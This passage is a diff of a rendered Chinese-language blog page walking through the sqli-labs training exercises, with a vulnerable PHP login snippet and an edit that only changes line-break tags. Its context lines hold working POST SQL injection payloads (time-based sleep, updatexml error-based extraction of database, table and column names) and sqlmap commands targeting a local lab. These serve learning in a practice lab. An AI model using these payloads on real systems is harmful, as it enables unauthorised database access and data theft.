class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Password:&#x27;</span> .$<span class="type">row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		</span><br><span class="line">  		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span>  </span><br><span class="line">	&#123;</span><br><span class="line">		echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
 
@@ -512,14 +512,14 @@
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-12/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs </code></p>
 <h3 id="14POST时间盲注"><a href="#14POST时间盲注" class="headerlink" title="14POST时间盲注"></a>14POST时间盲注</h3><p><code>&quot;</code>闭合 和13题一样</p>
-<br/>
+<br>
 
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-14/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
 <h3 id="15-POST时间-布尔盲注"><a href="#15-POST时间-布尔盲注" class="headerlink" title="15 POST时间/布尔盲注"></a>15 POST时间/布尔盲注</h3><p><code>uname=admin&#39; and sleep(5) #&amp; passwd=admin</code></p>
 <p>SQLmap</p>
 <p><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
-<br/>
+<br>
 
 <h3 id="16POST时间盲注"><a href="#16POST时间盲注" class="headerlink" title="16POST时间盲注"></a>16POST时间盲注</h3><p><code>uname=admin&quot;) and sleep(5) #&amp; passwd=admin</code></p>
 <p>SQLmap<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-16/ --data=&quot;uname=123&amp;passwd=123&amp;submit=Submit&quot; --batch --dbs</code></p>
@@ -535,7 +535,7 @@
 <p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ &amp;submit=Submit</code></p>
 <p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
 <p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
-<br/>
+<br>
 
 <p>SQLmap</p>
 <p><code>python sqlmap.py -r 1.txt --batch --dbs</code></p>
